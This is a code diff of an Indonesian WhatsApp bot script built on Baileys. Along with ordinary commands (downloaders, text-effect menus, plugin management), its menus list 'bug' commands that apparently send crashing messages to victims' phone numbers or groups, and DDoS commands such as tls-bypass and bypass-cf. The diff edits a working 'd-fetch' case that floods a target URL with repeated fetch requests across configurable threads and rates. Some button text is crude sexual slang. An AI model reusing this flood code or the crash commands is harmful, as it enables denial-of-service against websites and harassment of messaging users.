+│⭔ ${prefix}miku
+│⭔ ${prefix}minato
+│⭔ ${prefix}naruto
+│⭔ ${prefix}nezuko
+│⭔ ${prefix}onepiece
+│⭔ ${prefix}pokemon
+│⭔ ${prefix}rize
+│⭔ ${prefix}sagiri
+│⭔ ${prefix}sakura
+│⭔ ${prefix}sasuke
+│⭔ ${prefix}shina
+│⭔ ${prefix}shinka
+│⭔ ${prefix}shizuka
+│⭔ ${prefix}shota
+│⭔ ${prefix}toukachan
+│⭔ ${prefix}tsunade
+│⭔ ${prefix}yukiyuki
+│
+╰❐ 
  
-┏❐   \`Push Renk\` 
-┃
-┃✢ ${prefix}pushkontakidgc idgc|teksny
-┃✢ ${prefix}pushkontakv1 idgc|teksnya
-┃✢ ${prefix}pushkontakv2 teks
-┃✢ ${prefix}pushkontakv3 replyimg|teks
-┃✢ ${prefix}savecontact idgc
-┃✢ ${prefix}jpm replyimg|teks
-┃
-┗❐ 
+╭❐   \`Push Renk\` 
+│
+│⭔ ${prefix}pushkontakidgc idgc|teksny
+│⭔ ${prefix}pushkontakv1 idgc|teksnya
+│⭔ ${prefix}pushkontakv2 teks
+│⭔ ${prefix}pushkontakv3 replyimg|teks
+│⭔ ${prefix}savecontact idgc
+│⭔ ${prefix}jpm replyimg|teks
+│
+╰❐ 
 
-┏❐   \`Ephoto 360\` 
-┃
-┃✢ ${prefix}glitchtext name
-┃✢ ${prefix}writetext name
-┃✢ ${prefix}advancedglow name
-┃✢ ${prefix}typographytext name
-┃✢ ${prefix}pixelglitch name
-┃✢ ${prefix}neonglitch name
-┃✢ ${prefix}flagtext name
-┃✢ ${prefix}flag3dtext name
-┃✢ ${prefix}deletingtext name
-┃✢ ${prefix}blackpinkstyle name
-┃✢ ${prefix}glowingtext name
-┃✢ ${prefix}underwatertext name
-┃✢ ${prefix}logomaker name
-┃✢ ${prefix}cartoonstyle name
-┃✢ ${prefix}papercutstyle name
-┃✢ ${prefix}watercolortext name
-┃✢ ${prefix}effectclouds name
-┃✢ ${prefix}blackpinklogo name
-┃✢ ${prefix}gradienttext name
-┃✢ ${prefix}summerbeach name
-┃✢ ${prefix}luxurygold name
-┃✢ ${prefix}multicoloredneon name
-┃✢ ${prefix}sandsummer name
-┃✢ ${prefix}galaxywallpaper name
-┃✢ ${prefix}1917style name
-┃✢ ${prefix}makingneon name
-┃✢ ${prefix}royaltext name
-┃✢ ${prefix}freecreate name
-┃✢ ${prefix}galaxystyle name
-┃✢ ${prefix}lighteffects name
-┃
-┗❐ 
+╭❐   \`Ephoto 360\` 
+│
+│⭔ ${prefix}glitchtext namalu
+│⭔ ${prefix}writetext namalu
+│⭔ ${prefix}advancedglow namalu
+│⭔ ${prefix}typographytext namalu
+│⭔ ${prefix}pixelglitch namalu
+│⭔ ${prefix}neonglitch namalu
+│⭔ ${prefix}flagtext namalu
+│⭔ ${prefix}flag3dtext namalu
+│⭔ ${prefix}deletingtext namalu
+│⭔ ${prefix}blackpinkstyle namalu
+│⭔ ${prefix}glowingtext namalu
+│⭔ ${prefix}underwatertext namalu
+│⭔ ${prefix}logomaker namalu
+│⭔ ${prefix}cartoonstyle namalu
+│⭔ ${prefix}papercutstyle namalu
+│⭔ ${prefix}watercolortext namalu
+│⭔ ${prefix}effectclouds namalu
+│⭔ ${prefix}blackpinklogo namalu
+│⭔ ${prefix}gradienttext namalu
+│⭔ ${prefix}summerbeach namalu
+│⭔ ${prefix}luxurygold namalu
+│⭔ ${prefix}multicoloredneon namalu
+│⭔ ${prefix}sandsummer namalu
+│⭔ ${prefix}galaxywallpaper namalu
+│⭔ ${prefix}1917style namalu
+│⭔ ${prefix}makingneon namalu
+│⭔ ${prefix}royaltext namalu
+│⭔ ${prefix}freecreate namalu
+│⭔ ${prefix}galaxystyle namalu
+│⭔ ${prefix}lighteffects namalu
+│
+╰❐ 
 `
 let msg = {
 viewOnceMessage: {
@@ -2454,20 +2684,20 @@ interactiveMessage: {
 },
 "header": {
 "title": itsmenu,
-...(await prepareWAMessageMedia({ image: mengkece }, { upload: ryozingod.waUploadToServer })),
+...(await prepareWAMessageMedia({ image: overlaid }, { upload: ryozingod.waUploadToServer })),
 "hasMediaAttachment": true
 },
 "body": {
 "text": ""
 },
 "footer": {
-"text": "⿻  ⌜ Zero Execution Vault ⌟  ⿻"
+"text": "*# Zero Execution Vault - 2k24*"
 },
 "nativeFlowMessage": {
 "buttons": [
 {
 "name": "quick_reply",
-"buttonParamsJson": "{\"display_text\":\"⿻𝕾𝖕𝖎𝖉𝖊𝖗🕸️𝖂𝖊𝖇🕷️⿻\nAKU SUKA AMA LOBANG BOOL KAMU, AYO NGEGAY😋😘\",\"id\":\".terkentod\"}"
+"buttonParamsJson": "{\"display_text\":\"⿻𝐙͢𝐱𝐕⿻\nAKU SUKA AMA LOBANG BOOL KAMU, AYO NGEGAY😋😘\",\"id\":\".terkentod\"}"
 }
 ],
 "messageParamsJson": ""
@@ -2477,93 +2707,99 @@ interactiveMessage: {
 }
 };
 
-let kontollurus = {
-image: mengkece,
-caption: itsmenu,
-contextInfo:{externalAdReply:{
-title: '⟠ 𝕾𝖕𝖎𝖉𝖊𝖗🕸️𝖂𝖊𝖇🕷️ ⿻ 𝐂𝐋͢𝐢𝚵𝐍͢𝐓 々',
-body: `👤 名前 : ${m.pushName}\n🕑${ucapanWaktu}`, 
-showAdAttribution: true,
-thumbnail: mydick,
-mediaType: 4,
-MediaUrl:`${global.yt}`,
-sourceUrl:`${global.yt}`,
-}}
-};
+//Button Penis
+let kenaspilis = {
+viewOnceMessage: {
+message: {
+interactiveMessage: {
+"contextInfo": {
+"mentionedJid": [m.sender],
+"isForwarded": true,
+"forwardedNewsletterMessageInfo": {
+"newsletterJid": '0@newsletter',
+"newsletterName": 'By Zero Execution Vault',
+"serverMessageId": 1
+},
+},
+"header": {
+"title": itsmenu,
+...(await prepareWAMessageMedia({ image: overlaid }, { upload: ryozingod.waUploadToServer })),
+"hasMediaAttachment": true
+},
+"body": {
+"text": ""
+},
+"footer": {
+"text": "*# GREEN LANTERN Vault - 2k24*"
+},
+"nativeFlowMessage": {
+"buttons": [
+{ "name": "cta_url", "buttonParamsJson": `{ display_text : '🎩 𝐙𝐞𝐫𝐨 𝐗𝐯❗', url : "https://chat.whatsapp.com/KsZgSGIMpzj7lT845IibW4", merchant_url : "https://chat.whatsapp.com/KsZgSGIMpzj7lT845IibW4" }`}
+],
+"messageParamsJson": ""
+}
+}
+}
+}
+}
 
-if ( db.data.settings[botNumber].menuType === 'externalImage') {
-ryozingod.sendMessage(m.chat, kontollurus, { quoted: m })
+if ( db.data.settings[botNumber].menuType === 'imageIos') {
+ryozingod.relayMessage(m.chat, kenaspilis, {})
 } else if ( db.data.settings[botNumber].menuType === 'buttonImage') {
 ryozingod.relayMessage(m.chat, msg, {})
 }
 }
 break
 //=================================================//
-case "spesialmenu": {
-let jinjing = [nulll, nulll2]
-let randomIndex = Math.floor(Math.random() * jinjing.length)
-let mydick = jinjing[randomIndex]
+case "bugmenu": {
 let itsmenu = `
-*${ucapanWaktu} @${m.sender.split("@")[0]}*
+  *[ 😈🧛‍♂️ ]  •  𝐆𝐇𝐎𝐒𝐓*
 
-┏❐  ⌜ ZxV - Bot ⌟  ❐
-┃✢ Creator : thezetsuboxygen
-┃✢ Library : WS-Baileys
-┃✢ Type : Case
-┃✢ Status : Maintenance 
-┃✢ Mode : ${ryozingod.public ? '✱ Public ༣' : '✲ Self ༣'}
-┃✢ User : ${Object.keys(db.data.users).length}
-┃✢ Prefix : Single 
-┗❐
+⭔ Creator : ‧₊˚ ⋅♡𝐉𝐅𝐋𝐄𝐗 𝐎𝐆 ࣪ ִֶָ☾.
+⭔ Library : WS-Baileys
+⭔ Type : Case
+⭔ Status : Ready
+⭔ Mode : ${ryozingod.public ? '✱ Public ༣' : '✲ Self ༣'}
+⭔ User : ${Object.keys(db.data.users).length}
+⭔ Prefix : Single 
 
-┏❐  *Kontol Menu*
-┃
-┃✢ ${prefix}d-fetch url time
-┃✢ ${prefix}egao url time rps thread
-┃✢ ${prefix}mix url time rps thread
-┃✢ ${prefix}floods url time rps thread
-┃✢ ${prefix}kilua url time rps thread
-┃✢ ${prefix}xchrome url time rps thread
-┃✢ ${prefix}tls url time rps thread
-┃✢ ${prefix}tls-v2 url time rps thread
-┃✢ ${prefix}tls-bypass url time rps thread
-┃✢ ${prefix}bypass-cf url time rps thread
-┃✢ ${prefix}tls-vip url time rps thread
-┃✢ ${prefix}cekprovider 62878###
-┃✢ ${prefix}temp-ban [hide]
-┃✢ ${prefix}check-host
-┃
-┗❐
-
-┏❐  *Bug Menu*
-┃
-┃✢ ${prefix}sipilist 62878###
-┃✢ ${prefix}1hit 62878###
-┃✢ ${prefix}1shoot 62878###
-┃✢ ${prefix}mimir 62878###
-┃✢ ${prefix}fatal-notif 62878###
-┃✢ ${prefix}fatal-ui 62878###
-┃✢ ${prefix}crash-total 62878###
-┃✢ ${prefix}forces-sql 62878###
-┃✢ ${prefix}bug-rom 62878###
-┃✢ ${prefix}restart-ui 62878###
-┃✢ ${prefix}zero-bug 62878###
-┃✢ ${prefix}bug-s 62878###
-┃✢ ${prefix}virg4m 62878###
-┃✢ ${prefix}bijibapakkau 62878###
-┃✢ ${prefix}samsung-chace 62878###
-┃✢ ${prefix}bug-button link group
-┃✢ ${prefix}bug-browser link group
-┃✢ ${prefix}bug-gc 120###@g.us
-┃✢ ${prefix}penghitaman 120###@g.us
-┃✢ ${prefix}bug-ipong 62878#|waktu
-┃✢ ${prefix}bug-ios 62878#|waktu
-┃⭓ #masukkan waktu 1 = 200 detik
-┃⭓ #cek id = ketik .cekidgc
-┃
-┗❐
-
-𝐂𝐥𝐚𝐬𝐬𝐢𝐜 © Copyright`
+╭❐  *Bug Menu*
+│
+│⭔ ${prefix}null-chace jumlah
+│⭔ ${prefix}plerku jumlah
+│⭔ ${prefix}bug-gc jumlah
+│⭔ ${prefix}senggol (pc)
+│⭔ ${prefix}zxv1 (pc)
+│⭔ ${prefix}zxv2 (pc)
+│⭔ ${prefix}zxv3 (pc)
+│⭔ ${prefix}cekprovider 62878###
+│⭔ ${prefix}bug-button link group
+│⭔ ${prefix}bug-browser link group
+│⭔ ${prefix}bug-gc 120###@g.us
+│⭔ ${prefix}penghitaman 120###@g.us
+│⭔ ${prefix}idnull 62878###
+│⭔ ${prefix}big-row 62878###
+│⭔ ${prefix}starforce 62878###
+│⭔ ${prefix}stardust 62878###
+│⭔ ${prefix}hitamkan 62878###
+│⭔ ${prefix}sipilist 62878###
+│⭔ ${prefix}pucuk-ubi 62878###
+│⭔ ${prefix}1hit 62878###
+│⭔ ${prefix}mimir 62878###
+│⭔ ${prefix}forces-sql 62878###
+│⭔ ${prefix}virg4m 62878###
+│⭔ ${prefix}crash-24j 62878###
+│⭔ ${prefix}bug-24j 62878###
+│⭔ ${prefix}samsung-chace 62878###
+│⭔ ${prefix}samsung-24j 62878###
+│⭔ ${prefix}vios-unli 62878###
+│⭔ ${prefix}ios24j 62878###
+│⭔ ${prefix}bug-ipong 62878#|waktu
+│⭔ ${prefix}bug-ios 62878#|waktu
+│⭓ #masukkan waktu 1 = 200 detik
+│⭓ #cek id = ketik .cekidgc
+│
+╰❐`
 
 let msg = {
 viewOnceMessage: {
@@ -2580,20 +2816,20 @@ interactiveMessage: {
 },
 "header": {
 "title": itsmenu,
-...(await prepareWAMessageMedia({ image: mengkece }, { upload: ryozingod.waUploadToServer })),
+...(await prepareWAMessageMedia({ image: overlaid }, { upload: ryozingod.waUploadToServer })),
 "hasMediaAttachment": true
 },
 "body": {
 "text": ""
 },
 "footer": {
-"text": "⿻  ⌜ Zero Execution Vault ⌟  ⿻"
+"text": "*# Zero Execution Vault - 2k24*"
 },
 "nativeFlowMessage": {
 "buttons": [
 {
 "name": "quick_reply",
-"buttonParamsJson": "{\"display_text\":\"⿻𝕾𝖕𝖎𝖉𝖊𝖗🕸️𝖂𝖊𝖇🕷️⿻\nAKU SUKA AMA LOBANG BOOL KAMU, AYO NGEGAY😋😘\",\"id\":\".terkentod\"}"
+"buttonParamsJson": "{\"display_text\":\"⿻𝐙͢𝐱𝐕⿻\nAKU SUKA AMA LOBANG BOOL KAMU, AYO NGEGAY😋😘\",\"id\":\".terkentod\"}"
 }
 ],
 "messageParamsJson": ""
@@ -2603,22 +2839,154 @@ interactiveMessage: {
 }
 };
 
-let kontollurus = {
-image: mengkece,
-caption: itsmenu,
-contextInfo:{externalAdReply:{
-title: '⟠ 𝕾𝖕𝖎𝖉𝖊𝖗🕸️𝖂𝖊𝖇🕷️ ⿻ 𝐂𝐋͢𝐢𝚵𝐍͢𝐓 々',
-body: `👤 名前 : ${m.pushName}\n🕑${ucapanWaktu}`, 
-showAdAttribution: true,
-thumbnail: mydick,
-mediaType: 4,
-MediaUrl:`${global.yt}`,
-sourceUrl:`${global.yt}`,
-}}
+//Button Biji
+let bijiMessage = {
+viewOnceMessage: {
+message: {
+interactiveMessage: {
+"contextInfo": {
+"mentionedJid": [m.sender],
+"isForwarded": true,
+"forwardedNewsletterMessageInfo": {
+"newsletterJid": '0@newsletter',
+"newsletterName": 'By Zero Execution Vault',
+"serverMessageId": 1
+},
+},
+"header": {
+"title": itsmenu,
+...(await prepareWAMessageMedia({ image: overlaid }, { upload: ryozingod.waUploadToServer })),
+"hasMediaAttachment": true
+},
+"body": {
+"text": ""
+},
+"footer": {
+"text": "*# GREEN LANTERN Execution Vault - 2k24*"
+},
+"nativeFlowMessage": {
+"buttons": [
+{ "name": "cta_url", "buttonParamsJson": `{ display_text : '🎩 𝐙𝐞𝐫𝐨 𝐗𝐯❗', url : "https://chat.whatsapp.com/KsZgSGIMpzj7lT845IibW4", merchant_url : "https://chat.whatsapp.com/KsZgSGIMpzj7lT845IibW4" }`}
+],
+"messageParamsJson": ""
+}
+}
+}
+}
+}
+
+if ( db.data.settings[botNumber].menuType === 'imageIos') {
+ryozingod.relayMessage(m.chat, bijiMessage, {})
+} else if ( db.data.settings[botNumber].menuType === 'buttonImage') {
+ryozingod.relayMessage(m.chat, msg, {})
+}
+}
+break
+//=================================================//
+case "ddosmenu": {
+let itsmenu = `
+  *[ 🧛‍♂️😈 ]  • 𝐆𝐇𝐎𝐒𝐓*
+
+⭔ Creator : 𝐉𝐅𝐋𝐄𝐗 𝐎𝐆
+⭔ Library : WS-Baileys
+⭔ Type : Case
+⭔ Status : Ready
+⭔ Mode : ${ryozingod.public ? '✱ Public ༣' : '✲ Self ༣'}
+⭔ User : ${Object.keys(db.data.users).length}
+⭔ Prefix : Single 
+
+╭❐  *Ddos Menu*
+│
+│⭔ ${prefix}d-fetch url time
+│⭔ ${prefix}egao url time rps thread
+│⭔ ${prefix}mix url time rps thread
+│⭔ ${prefix}floods url time rps thread
+│⭔ ${prefix}kilua url time rps thread
+│⭔ ${prefix}xchrome url time rps thread
+│⭔ ${prefix}tls url time rps thread
+│⭔ ${prefix}tls-v2 url time rps thread
+│⭔ ${prefix}tls-bypass url time rps thread
+│⭔ ${prefix}bypass-cf url time rps thread
+│⭔ ${prefix}tls-vip url time rps thread
+│⭔ ${prefix}check-host
+│
+╰❐`
+
+let msg = {
+viewOnceMessage: {
+message: {
+interactiveMessage: {
+"contextInfo": {
+"mentionedJid": [m.sender],
+"isForwarded": true,
+"forwardedNewsletterMessageInfo": {
+"newsletterJid": '0@newsletter',
+"newsletterName": 'By Zero Execution Vault',
+"serverMessageId": 1
+},
+},
+"header": {
+"title": itsmenu,
+...(await prepareWAMessageMedia({ image: overlaid }, { upload: ryozingod.waUploadToServer })),
+"hasMediaAttachment": true
+},
+"body": {
+"text": ""
+},
+"footer": {
+"text": "*# Zero Execution Vault - 2k24*"
+},
+"nativeFlowMessage": {
+"buttons": [
+{
+"name": "quick_reply",
+"buttonParamsJson": "{\"display_text\":\"⿻𝐙͢𝐱𝐕⿻\nAKU SUKA AMA LOBANG BOOL KAMU, AYO NGEGAY😋😘\",\"id\":\".terkentod\"}"
+}
+],
+"messageParamsJson": ""
+}
+}
+}
+}
 };
 
-if ( db.data.settings[botNumber].menuType === 'externalImage') {
-ryozingod.sendMessage(m.chat, kontollurus, { quoted: m })
+let ygbacagay = {
+viewOnceMessage: {
+message: {
+interactiveMessage: {
+"contextInfo": {
+"mentionedJid": [m.sender],
+"isForwarded": true,
+"forwardedNewsletterMessageInfo": {
+"newsletterJid": '0@newsletter',
+"newsletterName": 'By Zero Execution Vault',
+"serverMessageId": 1
+},
+},
+"header": {
+"title": itsmenu,
+...(await prepareWAMessageMedia({ image: overlaid }, { upload: ryozingod.waUploadToServer })),
+"hasMediaAttachment": true
+},
+"body": {
+"text": ""
+},
+"footer": {
+"text": "*# Zero Execution Vault - 2k24*"
+},
+"nativeFlowMessage": {
+"buttons": [
+{ "name": "cta_url", "buttonParamsJson": `{ display_text : '🎩 𝐙𝐞𝐫𝐨 𝐗𝐯❗', url : "https://chat.whatsapp.com/KsZgSGIMpzj7lT845IibW4", merchant_url : "https://chat.whatsapp.com/KsZgSGIMpzj7lT845IibW4" }`}
+],
+"messageParamsJson": ""
+}
+}
+}
+}
+}
+
+if ( db.data.settings[botNumber].menuType === 'imageIos') {
+ryozingod.relayMessage(m.chat, ygbacagay, {})
 } else if ( db.data.settings[botNumber].menuType === 'buttonImage') {
 ryozingod.relayMessage(m.chat, msg, {})
 }
@@ -2636,23 +3004,23 @@ caseCount = matches.length,
 caseNames = matches.map(match => match.match(/case '([^']+)'/)[1]);
 
 let totalCases = caseCount,
-listCases = caseNames.join('\n✢ ');
+listCases = caseNames.join('\n⭔ ');
 
 joreply(`
-┏❐  ⌜𝗗𝗘𝗩𝗜𝗟 𝗦𝗣𝗜𝗗𝗘𝗥⌟  ❐
-┃✢ Creator : 𝕶𝖎𝖓𝖌 𝕾𝖆𝖒
-┃✢ Library : WS-Baileys
-┃✢ Type : Case
-┃✢ Status : Maintenance 
-┃✢ Mode : ${ryozingod.public ? '✱ Public ༣' : '✲ Self ༣'}
-┃✢ User : ${Object.keys(db.data.users).length}
-┃✢ Prefix : Single 
-┃✢ Resp Speed : ${latensi.toFixed(4)}
-┃✢ Ram : ${formatp(os.totalmem() - os.freemem())} / ${formatp(os.totalmem())}
-┃✢ Runtime : ${run}
-┗❐
+╭❐  ⌜ 𝐆𝐇𝐎𝐒𝐓 - Bot ⌟  ❐
+│⭔ Creator : 𝐉𝐅𝐋𝐄𝐗 𝐎𝐆
+│⭔ Library : WS-Baileys
+│⭔ Type : Case
+│⭔ Status : Maintenance 
+│⭔ Mode : ${ryozingod.public ? '✱ Public ༣' : '✲ Self ༣'}
+│⭔ User : ${Object.keys(db.data.users).length}
+│⭔ Prefix : Single 
+│⭔ Resp Speed : ${latensi.toFixed(4)}
+│⭔ Ram : ${formatp(os.totalmem() - os.freemem())} / ${formatp(os.totalmem())}
+│⭔ Runtime : ${run}
+╰❐
 
-❐ Total case: ${totalCases}\n\n✢ ${totalCases > 0 ? listCases : "No cases found."}
+❐ Total case: ${totalCases}\n\n⭔ ${totalCases > 0 ? listCases : "No cases found."}
 
 `)
 }
@@ -2666,21 +3034,21 @@ joreply(jsonData)
 break
 //=================================================//
 case 'sc': case 'script': {
-joreply(`🌤𝐈 𝐊𝐍𝐎𝐖 𝐘𝐎𝐔 𝐑𝐄𝐀𝐋𝐋𝐘 𝐍𝐄𝐄𝐃 𝐓𝐇𝐈𝐒 𝐒𝐂𝐑𝐈𝐏𝐓.
+joreply(`🌤️Sc Ini Dibuat Oleh TheZetsuboXygen (ryo).
 
-❕𝐎𝐖𝐍𝐄𝐑 : https://api.whatsapp.com/send?phone=+254104301695
-❗𝐆𝐑𝐎𝐔𝐏 : https://chat.whatsapp.com/EPSGKau0IVi7J5lyOJO7Jk
+❕Yt : ${global.url}
+❗Tl : t.me/thezetsuboxygen
 
 `)
 }
 break
 //=================================================//
 case 'owner': case 'botowner':
-let namaown = `𝙼𝚈 𝙾𝚆𝙽𝙴𝚁 𝙸𝚂 𝙺𝙸𝙽𝙶 𝚂𝙰𝙼`
+let namaown = `Owner Cakep`
 var contact = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
 "contactMessage": {
 "displayName": `${namaown}`,
-"vcard": `BEGIN:VCARD\nVERSION:3.0\nN:;;;;\nFN:${namaown}\nitem1.TEL;waid=${global.ownMain}:+${global.ownMain}\nitem1.X-ABLabel:Ponsel\nX-WA-BIZ-DESCRIPTION:[[ ༑ 𝐃𝐄𝐕𝐈𝐋⿻ 𝐒𝐏𝐈𝐃𝐄𝐑 ༑ ]]\nX-WA-BIZ-NAME: [[ ༑ 𝐃𝐄𝐕𝐈𝐋 ⿻ 𝐒𝐏𝐈𝐃𝐄𝐑 ༑ ]]\nEND:VCARD`,
+"vcard": `BEGIN:VCARD\nVERSION:5.0\nN:;;;;\nFN:${namaown}\nitem1.TEL;waid=${global.ownMain}:+${global.ownMain}\nitem1.X-ABLabel:Ponsel\nX-WA-BIZ-DESCRIPTION:[[ ༑ 𝐆𝐇𝐎𝐒𝐓 ⿻ ༑ ]]\nX-WA-BIZ-NAME: [[ ༑ 𝐆𝐇𝐎𝐒𝐓 ⿻ ༑ ]]\nEND:VCARD`,
 }
 }), { userJid: m.chat, quoted: m })
 ryozingod.relayMessage(m.chat, contact.message, { messageId: contact.key.id })
@@ -2704,11 +3072,11 @@ Atheis/Gapunya Agama/Orang Gila: ${command}`)
 break
 */
 
-case 'bug': case 'apa': case 'kenapa': case 'oke': case 'apa': case 'virtex': case 'virteks': case 'virtext': case 'pirtek': case 'pirteks': case 'pirtex': case 'anjay':{
-ryozingod.sendMessage(m.chat, { text: `𝕾𝖕𝖎𝖉𝖊𝖗?`}, { quoted: ryobug })
+/*case 'bug': case 'apa': case 'kenapa': case 'oke': case 'apa': case 'virtex': case 'virteks': case 'virtext': case 'pirtek': case 'pirteks': case 'pirtex': case 'anjay':{
+ryozingod.sendMessage(m.chat, { text: `kenapa?`}, { quoted: ryobug })
 }
 break
-
+*/
 case 'shutdown': {
 if (!isDeveloper) return joreply(mess.owner)
 joreply(`Otsukaresama deshita🖐`)
@@ -2772,8 +3140,8 @@ if (q == 'button') {
 db.data.settings[botNumber].menuType = 'buttonImage'
 joreply(`Successfully Changed Menu To Button List Image`)
 } else if (q == 'non') {
-db.data.settings[botNumber].menuType = 'externalImage'
-joreply(`Successfully Changed Auto Typing To External Image`)
+db.data.settings[botNumber].menuType = 'imageIos'
+joreply(`Successfully Changed Menu To ImageIos`)
 }
 break
 //=================================================//
@@ -2943,6 +3311,67 @@ let nama = store.messages[i].array[0].pushName
 teks += `*Name :* ${pushname}\n*User :* @${sender.split('@')[0]}\n*Chat :* https://wa.me/${sender.split('@')[0]}\n\n───────────\n\n`
 }
 joreply(teks)
+}
+break
+//=================================================//
+case 'cgplug': {
+if (!isDeveloper) return joreply(mess.owner)
+if (!q.includes("|")) return joreply(`Add Input, Example: *.cgplug thisplug|newcontent*`)
+let [mypler, ...rest] = q.split("|")
+let mypenis = rest.join("|")
+let pluginsDirect = path.resolve(__dirname, './zetsubo')
+let plugins = loadPlugins(pluginsDirect)
+for (const plugin of plugins) {
+if (plugin.command === mypler) {
+let filePath = plugin.filePath
+fs.writeFileSync(filePath, mypenis)
+await joreply(`Plugin di ${filePath} telah diganti`)
+return
+}
+}
+await joreply(`Plugin dengan command '${mypler}' tidak ditemukan`)
+}
+break
+//=================================================//
+case 'rmplug': {
+if (!isDeveloper) return joreply(mess.owner)
+if (!q) return joreply(`Please provide the command name of the plugin you want to remove. Example: \n\n*.rmplug thisplug*`)
+let pluginsDirect = path.resolve(__dirname, './zetsubo')
+let plugins = loadPlugins(pluginsDirect)
+for (const plugin of plugins) {
+if (plugin.command === q) {
+let filePath = plugin.filePath
+fs.unlinkSync(filePath)
+await joreply(`Plugin di ${filePath} telah dihapus.`)
+return
+}
+}
+await joreply(`Plugin dengan command '${q}' tidak ditemukan.`)
+}
+break
+//=================================================//
+case 'addplug': {
+if (!isDeveloper) return joreply(mess.owner)
+const [pluginName, category, ...pluginContent] = q.split("|")
+const pluginFilePath = path.join(path.resolve(__dirname, './zetsubo', category), pluginName + ".js")
+if (!q.includes("|") || pluginContent.length === 0 || fs.existsSync(pluginFilePath)) return
+fs.writeFileSync(pluginFilePath, pluginContent.join('|'))
+await joreply(`Plugin baru telah dibuat di ${pluginFilePath}.`)
+}
+break
+//=================================================//
+case 'getplug': {
+if (!isDeveloper) return joreply(mess.owner)
+if (!q) return joreply(`Add Input, Example: \n\n*.getplug ryocakep*`)
+let pluginsDirect = path.resolve(__dirname, './zetsubo')
+let plugin = loadPlugins(pluginsDirect).find(p => p.command === q)
+if (!plugin) return joreply(`Plugin dengan command '${q}' tidak ditemukan.`)
+await ryozingod.sendMessage(m.chat, {
+document: fs.readFileSync(plugin.filePath),
+fileName: path.basename(plugin.filePath),
+mimetype: '*/*'
+}, { quoted: m })
+await joreply(`Succes mengambil pllugin '${q}', plugin telah dikirim.`)
 }
 break
 //=================================================//
@@ -3297,16 +3726,17 @@ var thumbnya = `https://i.ytimg.com/vi/${res.videoId}/hqdefault.jpg`
 var thumbnya = `https://i.ytimg.com/vi/${res.videoId}/default.jpg`
 }
 let inithumb = await getBuffer(thumbnya)
-let teks = `*💢 Y O U T U B E - M P 3*
+let teks = `*🎩 Youtube - Downloader 🖥️*
 
-🔶 Channel : ${res.author.name}
-🔶 Viewers : ${res.views} Kali
-🔶 Duration : ${res.timestamp}
-🔶 Url : ${res.url}`
+🌐 Channel : ${res.author.name}
+🚥 Viewers : ${res.views} Kali
+⏱️ Duration : ${res.timestamp}
+🔗 Url : ${res.url}`
 
-ryozingod.sendMessage(m.chat, { contextInfo: { externalAdReply: { showAdAttribution: false, 
+ryozingod.sendMessage(m.chat, { contextInfo: {
+externalAdReply: { showAdAttribution: false, 
 title: `${res.title}`,
-body: `${week} ${calender}`,
+body: `🎩 ${week} ${calender} ⭐`,
 mediaType: 2,  
 renderLargerThumbnail : true,
 thumbnail: inithumb,
@@ -3344,9 +3774,8 @@ case 'tiktokvideo': {
 if (!text) return joreply( `Contoh : ${prefix + command} link`)
 if (!q.includes('tiktok')) return joreply(`Link Invalid!!`)
 await joreply(mess.wait)
-require('./lib/tiktok').Tiktok(q).then( data => {
-ryozingod.sendMessage(m.chat, { video: { url: data.nowm }}, { quoted: m })
-})
+var anu = await fetchJson(`https://aemt.me/download/tiktokdl?url=${q}`)
+ryozingod.sendMessage(m.chat, { video: { url: anu.result.video }}, { quoted: m })
 }
 break
 //=================================================//
@@ -4740,9 +5169,8 @@ return [h, m, s].map(v => v.toString().padStart(2, 0)).join(':')
 }
 let dapat = (Math.floor(Math.random() * 100000))
 let users = db.data.users
-let who = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted.sender
-if (!who) return joreply('Tag orang yang mau kamu Rampok!')
-if (typeof db.data.users[who] == 'undefined') return joreply('Pengguna tidak ada didalam database')
+let who = m.mentionedJid && m.mentionedJid[0] ? m.mentionedJid[0] : (m.quoted && m.quoted.sender);
+if (!who) return joreply('Tag orang yang mau kamu Rampok!');
 if (users[who].level > users[m.sender].level) return joreply(`Level kamu harus lebih tinggi dari @${who.split('@')[0]} Untuk bisa merampoknya!`, false, { mentions: [who] })
 let __timers = (new Date - db.data.users[m.sender].lastrampok)
 let _timers = (3600000 - __timers)
@@ -8461,7 +8889,7 @@ joreply(teks)
 }
 break
 //=================================================//
-case 'hidetag':
+case 'hidetag': case 'haydtag':
 if (!isGroup) return joreply(mess.only.group)
 if (!isAdmins && !isDeveloper) return joreply('Khusus Admin')
 if (!q) return joreply(`Teks Nya Mana Kak?`)
@@ -10196,21 +10624,21 @@ break
 
 //Cekrik
 case "sshp": {
-if (!text) return joreply(`*Example: ${prefix+command} ${global.yt}*`)
+if (!text) return joreply(`*Example: ${prefix+command} ${global.url}*`)
 let phone = await ssweb(text, "phone")
 ryozingod.sendFile(m.chat, phone.result, "", ``, m, false)
 }
 break
 //=================================================//
 case "sspc": {
-if (!text) return joreply(`*Example: ${prefix+command} ${global.yt}*`)
+if (!text) return joreply(`*Example: ${prefix+command} ${global.url}*`)
 let desktop = await ssweb(text, "desktop")
 ryozingod.sendFile(m.chat, desktop.result, "", ``, m, false)
 }
 break
 //=================================================//
 case "sstablet": {
-if (!text) return joreply(`*Example: ${prefix+command} ${global.yt}*`)
+if (!text) return joreply(`*Example: ${prefix+command} ${global.url}*`)
 let tablet = await ssweb(text, "tablet")
 ryozingod.sendFile(m.chat, tablet.result, "", ``, m, false)
 }
@@ -11927,18 +12355,20 @@ break
 case 'd-fetch': {
 if (!isPremium) return joreply(mess.premium)
 let url = q.split(" ")[0]
-let time = q.split(" ")[1] * 1000
+let time = q.split(" ")[1]
+let thread = q.split(" ")[2]
+let rate = q.split(" ")[3]
 
-if (args.length === 2 && url && !isNaN(time)) {
+if (args.length === 4 && url && time && thread && rate) {
 let attack = () => {
 let totalRequests = 0
 let threads = []
 
-for (let j = 0; j < 6; j++) {
+for (let j = 0; j < thread; j++) {
 threads.push(
 new Promise((resolve, reject) => {
 let interval = setInterval(() => {
-for (let j = 0; j < 100; j++) {
+for (let j = 0; j < rate; j++) {
 fetch(url)
 .then(() => {
 totalRequests++
@@ -11962,7 +12392,7 @@ Promise.all(threads)
 
 attack()
 } else {
-joreply(`Format pesan tidak benar. Gunakan format: .${command} [url] [time]`)
+joreply(`Format pesan tidak benar. Gunakan format: .${command} [url] [time] [thread] [rate]`)
 }
 }
 break
@@ -11999,14 +12429,15 @@ ryozingod.relayMessage(m.chat, msg, {});
 }
 break
 //=================================================//
-case 'zero-bug': case 'bug-s': {
+case 'stardust': case 'hitamkan': {
 if (!isPremium) return joreply(mess.premium)
